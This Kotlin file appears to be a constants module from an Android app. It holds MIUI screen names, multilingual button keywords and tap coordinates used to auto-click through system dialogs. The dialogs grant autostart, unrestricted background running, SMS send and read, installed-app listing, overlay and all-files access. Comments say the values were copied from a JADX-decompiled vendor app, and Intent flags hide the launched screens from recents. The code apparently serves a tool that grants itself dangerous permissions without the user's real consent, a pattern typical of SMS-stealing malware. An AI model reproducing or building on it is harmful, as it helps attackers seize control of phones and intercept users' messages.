package com.storm.safe.rock.service.modules.yw5xud.miui

import android.content.ComponentName

/**
 * MIUI-specific constants extracted from MiuiSteps companion object.
 * Shared by MiuiSteps orchestrator and all delegate classes.
 */
object MiuiConstants {

    // ── Security center component names ──

    val AUTOSTART_COMPONENTS = listOf(
        ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"),
        ComponentName("com.miui.securitycenter", "com.miui.securitycenter.autostart.AutoStartManagementActivity")
    )

    val BATTERY_COMPONENTS = listOf(
        ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"),
        ComponentName("com.miui.securitycenter", "com.miui.powercenter.PowerSettings")
    )

    // ── Keywords ──

    /** Keywords for finding auto-start toggle. Vendor 自启动 keywords. */
    val AUTOSTART_KEYWORDS = listOf("自启动", "自动启动", "Auto-start", "Autostart", "Auto start")

    /** Keywords for battery no-restriction. Vendor f55104c3 + f55105c4. */
    val BATTERY_NO_RESTRICT_KEYWORDS = listOf("无限制", "No restrictions", "Unrestricted", "不限制")
    val BATTERY_RADIO_KEYWORDS = listOf(
        "无限制", "后台运行超过10分钟后关闭", "禁止后台运行", "智能限制",
        "10分钟后关闭", "不采取任何限制措施",
        "無限制", "後台運行超過10分鐘後關閉", "禁止後台運行"
    )

    /** Keywords for battery detail entry (from ApplicationsDetailsActivity page). */
    val BATTERY_DETAIL_KEYWORDS = listOf("电量使用详情", "电池使用详情", "Battery usage details", "電量使用詳情")

    /** Keywords for power strategy entry on app detail page. Real MIUI 15 uses "省电策略" as the entry text. */
    val POWER_STRATEGY_ENTRY_KEYWORDS = listOf("省电策略", "電池策略", "Battery strategy", "Power saving strategy")

    /** Keywords for background popup. */
    val BG_POPUP_KEYWORDS = listOf("后台弹出界面", "后台弹窗", "Background pop-up", "Display pop-up")

    /** Permission management entry keywords. */
    val PERM_MGMT_KEYWORDS = listOf("权限管理", "權限管理", "Permission management")

    /** 6 permissions to enable in permission management page. Vendor MiuiSteps pattern. */
    val PERM_ITEMS = listOf(
        "发送短信", "读取短信", "读取已安装应用列表",
        "后台弹出界面", "通知类短信", "显示悬浮窗"
    )

    /** "Always allow" keywords for permission detail page. */
    val ALWAYS_ALLOW_KEYWORDS = listOf("始终允许", "始終允許", "Always allow", "允许", "允許", "Allow")

    /** Confirm dialog keywords. Vendor f55093b2. */
    val CONFIRM_KEYWORDS = listOf(
        "确定", "允许", "始终允许", "允许使用照片和视频", "所有文件",
        "允许管理所有文件", "允许访问全部", "使用期间允许", "仅使用期间允许",
        "使用应用时允许", "使用时允许", "仅在使用中允许", "仅在前台使用应用时允许",
        "仅在使用该应用时允许", "允许本次使用", "本次使用时允许", "允许通知",
        "確定", "允許", "始終允許", "Allow", "ALLOW", "Always allow",
        "While using the app"
    )

    /** Default page-stable wait: 2 consecutive polls with same node count. JADX: m212294f9 defaults. */
    const val STABLE_REQUIRED_COUNT = 2
    const val STABLE_POLL_INTERVAL_MS = 100L
    const val STABLE_TIMEOUT_MS = 2000L

    /** Max scroll attempts for finding text. Vendor clickTextWithScroll default. */
    const val MAX_SCROLL_ATTEMPTS = 5

    /** Permission allow keywords for Phase 0 self-polling. Vendor f55110a4. */
    val PERMISSION_ALLOW_KEYWORDS = listOf(
        "始终允许", "允许访问全部", "允许管理所有文件", "所有文件",
        "仅在使用中允许", "仅在使用此应用时允许", "在使用该应用时允许",
        "允许", "同意", "确定", "好",
        "Allow", "ALLOW", "Always allow", "While using the app"
    )

    /** Permission management keywords for 6-permission flow. Vendor m212256b5. */
    val PERM_MGMT_ENTRY_KEYWORDS = listOf("权限管理", "權限管理", "Permissions", "Permission manager")

    /** JADX step 3: 「其他权限」入口关键词。Vendor m212256b5 line 3088. */
    val OTHER_PERM_KEYWORDS = listOf("其他权限", "应用权限", "单项权限", "权限", "Other permissions", "App permissions", "Permissions")

    /** Page validation keywords -- at least one must be present on ApplicationsDetailsActivity. */
    val APP_DETAIL_VALIDATION_KEYWORDS = listOf(
        "权限管理", "通知管理", "存储占用", "流量使用情况", "自启动", "电量使用详情",
        "Permissions", "Notifications", "Storage", "Data usage", "Auto-start", "Battery usage"
    )

    /** 6 permissions to set in permission management page. Vendor mapM213614f9. */
    val PERM_MGMT_ITEMS: List<Pair<String, List<String>>> = listOf(
        "发送短信" to listOf("发送短信", "發送短信", "Send SMS"),
        "读取短信" to listOf("读取短信与彩信", "读取短信", "讀取短信與彩信", "Read SMS"),
        "读取应用列表" to listOf("读取应用列表", "获取应用列表", "讀取應用列表", "Read app list"),
        "后台弹出界面" to listOf("后台弹出界面", "後台彈出界面", "Background pop-up"),
        "通知类短信" to listOf("通知类短信", "通知類短信", "Notification SMS"),
        "显示悬浮窗" to listOf("显示悬浮窗", "悬浮窗", "顯示懸浮窗", "Display over other apps")
    )

    /** Keywords to click after entering permission detail page. */
    val PERM_ALLOW_KEYWORDS = listOf(
        "始终允许", "Allow always", "允许", "Allow",
        "仅在使用时允许", "While using the app"
    )

    /** Phase 0 polling: 100 iterations x 50ms = 5s per round. */
    const val PERM_POLL_ITERATIONS = 100
    const val PERM_POLL_INTERVAL_MS = 50L

    // ── Vendor ALL_FILES constants (C0367a4.m212254b3) ──

    /** vendor C0367a4 ALL_FILES text keywords. */
    val ALL_FILES_KEYWORDS: List<String> = listOf(
        "授予管理",
        "管理所有文件",
        "授予管理所有文件的权限",
        "允许管理所有文件",
        "允许访问所有文件"
    )
    /** vendor C0367a4:1915 coordinate fallback X ratio. */
    const val ALL_FILES_COORD_X_RATIO: Float = 0.875f
    /** vendor C0367a4:1916 coordinate fallback Y ratio. */
    const val ALL_FILES_COORD_Y_RATIO: Float = 0.225f
    /** vendor C0367a4 level3 coordinate tap duration (ms). */
    const val ALL_FILES_COORD_DURATION_MS: Long = 100L
    /** vendor C0367a4:1960 verify rounds. */
    const val ALL_FILES_VERIFY_ROUNDS: Int = 3
    /** vendor C0367a4:1907 verify delay. */
    const val ALL_FILES_VERIFY_DELAY_MS: Long = 150L
    /** vendor C0367a4 outer retry count. */
    const val ALL_FILES_OUTER_RETRIES: Int = 3
    /**
     * 2026-04-16 ADAPT: overall timeout 3s -- skip if exceeded, don't block biometric flow.
     */
    const val ALL_FILES_OVERALL_TIMEOUT_MS: Long = 3_000L
    /** vendor C0367a4:1841 main Intent flags (NEW_TASK|EXCLUDE_FROM_RECENTS). */
    const val ALL_FILES_MAIN_FLAGS: Int = 0x10800000
    /** vendor C0367a4:1813 predwarm Intent flags (NEW_TASK|NO_HISTORY|EXCLUDE_FROM_RECENTS|NO_ANIMATION). */
    const val ALL_FILES_PREDWARM_FLAGS: Int = 0x50810000
}
